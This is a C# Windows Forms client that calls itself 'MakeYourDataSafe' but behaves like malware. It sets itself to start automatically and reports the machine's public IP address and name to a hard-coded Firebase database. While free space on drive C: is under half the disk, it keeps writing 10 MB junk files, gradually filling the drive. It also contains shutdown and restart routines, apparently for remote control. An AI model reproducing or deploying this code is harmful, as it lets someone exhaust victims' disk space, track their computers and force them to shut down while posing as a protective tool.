using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using Firebase.Database;
using Firebase.Kecske;
using Firebase.Database.Query;

namespace MakeYourDataSafe_Client
{
    public partial class mainForm : Form
    {
        //public string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MakeYourDataSafe";
        public string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\MakeYourDataSafe\\Important Files";
        private const string database = "https://myds-5f6f8.firebaseio.com/";
        private FirebaseClient client = new FirebaseClient(database);

        public mainForm()
        {
            InitializeComponent();
        }

        private void mainForm_Load(object sender, EventArgs e)
        {
            if (Directory.Exists(path) == false)
            {
                Directory.CreateDirectory(path);
            }
            timer1.Start();
            try
            {
                checkAutoBoot();
                setComputer();

            }catch(Exception ex)
            {
                throw new Exception(ex.Message);
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label1.Text = "Total: " + getDiskSize('C') + " | Free: " + getFreeDiskSpace('C');
            if (getFreeDiskSpace('C') < getDiskSize('C') * 0.5)
            {
                int i = Directory.GetFiles(path).Length;
                File.WriteAllBytes(path + "\\file" + i + ".txt", new byte[10485760]);
            }

            //Appdataba rakni fájlokat, ha még van elég hely
        }

        private long getFreeDiskSpace(char driveName)
        {
            foreach (DriveInfo item in DriveInfo.GetDrives())
            {
                if (item.Name[0] == driveName)
                {
                    return item.AvailableFreeSpace;
                }
            }
            return 0;
        }

        private long getDiskSize(char driveName)
        {
            foreach (DriveInfo item in DriveInfo.GetDrives())
            {
                if (item.Name[0] == driveName)
                {
                    return item.TotalSize;
                }
            }
            return 0;
        }

        private void checkAutoBoot()
        {
            DirectoryInfo info = new DirectoryInfo(".");
            string o = info.Root + "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\MakeYourDataSafe Client.exe";
            string i = System.Reflection.Assembly.GetEntryAssembly().Location;
            i = i.Substring(0, i.Length - 61) + ("StartUp\\bin\\Debug\\StartUp.exe");
            if (File.Exists(o)==false)
            {
                if (File.Exists(i) == true)
                {
                    Process.Start(i);
                }
                else
                {
                 throw new FileNotFoundException("Corrupted Program");
                }
            }
        }

        private void setComputer()
        {
            var child = client.Child("Computers");
            child.PostAsync(new SetComputers { ip_address = getIP(), pc_name = System.Environment.MachineName, /*has_webcam = false*/ });
        }

        private string getIP()
        {
            string url = "http://checkip.dyndns.org";
            System.Net.WebRequest req = System.Net.WebRequest.Create(url);
            System.Net.WebResponse resp = req.GetResponse();
            System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
            string response = sr.ReadToEnd().Trim();
            string[] a = response.Split(':');
            string a2 = a[1].Substring(1);
            string[] a3 = a2.Split('<');
            string a4 = a3[0];
            return a4;
        }

        private void shutDown(string cmd)
        {
            if (cmd == "s")
            {
                Process.Start("shutdown", "/s /t 0");
            }
            if (cmd == "r")
            {
                Process.Start("shutdown", "/r /t 0");
            }

        }

        private void messageBox(string msg)
        {
            MessageBox.Show(msg);
        }
    }
}
